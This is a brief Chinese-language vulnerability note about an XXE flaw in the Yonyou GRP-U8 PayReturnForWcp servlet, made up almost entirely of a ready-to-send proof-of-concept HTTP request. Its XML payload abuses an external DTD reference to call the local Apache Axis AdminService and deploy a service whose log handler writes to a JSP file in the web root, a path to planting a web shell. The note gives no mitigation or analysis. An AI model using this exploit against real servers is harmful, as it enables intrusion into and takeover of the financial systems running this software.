## 用友GRP-U8-PayReturnForWcp接口存在XXE漏洞

## poc
```
POST /servlet/PayReturnForWcp HTTP/1.1
Host: 172.16.135.132:8009
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.16.135.130:8009/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=6C0DA8A7DF854722ECB4A690B53F0C00
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 830

<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://127.0.0.1:8009/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22Opentke%22%20provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler%20type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22%20%3E%3Cparameter%20name%3D%22LogHandler.fileName%22%20value%3D%22C:\UFGOV\U8\webapps\bx_cxjk_list.jsp%22%20%2F%3E%3Cparameter%20name%3D%22LogHandler.writeToConsole%22%20value%3D%22false%22%20%2F%3E%3C%2Fhandler%3E%3C%2FrequestFlow%3E%3Cparameter%20name%3D%22className%22%20value%3D%22java.util.Random%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%20%2F%3E%3C%2Fservice%3E%3C%2Fdeployment">
```
